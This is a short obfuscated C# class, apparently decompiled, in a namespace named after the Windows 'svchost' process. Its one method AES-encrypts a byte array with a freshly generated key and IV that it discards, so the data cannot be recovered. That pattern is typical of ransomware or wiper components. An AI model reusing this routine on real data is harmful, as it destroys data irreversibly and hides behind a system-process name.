using System.IO;
using System.Security.Cryptography;

namespace svchost;

internal class AckHyjsYZLwpcMxw
{
	private RijndaelManaged RkpXnlYbQjDCuNPC = new RijndaelManaged();

	public byte[] KRhglaYZPPkEsfTL(byte[] gUCGnMNbBGbDwHAF)
	{
		try
		{
			RkpXnlYbQjDCuNPC.Mode = CipherMode.CBC;
			RkpXnlYbQjDCuNPC.Padding = PaddingMode.PKCS7;
			RkpXnlYbQjDCuNPC.GenerateKey();
			RkpXnlYbQjDCuNPC.GenerateIV();
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, RkpXnlYbQjDCuNPC.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(gUCGnMNbBGbDwHAF, 0, gUCGnMNbBGbDwHAF.Length);
			cryptoStream.Close();
			return memoryStream.ToArray();
		}
		catch (CryptographicException)
		{
			return null;
		}
	}
}
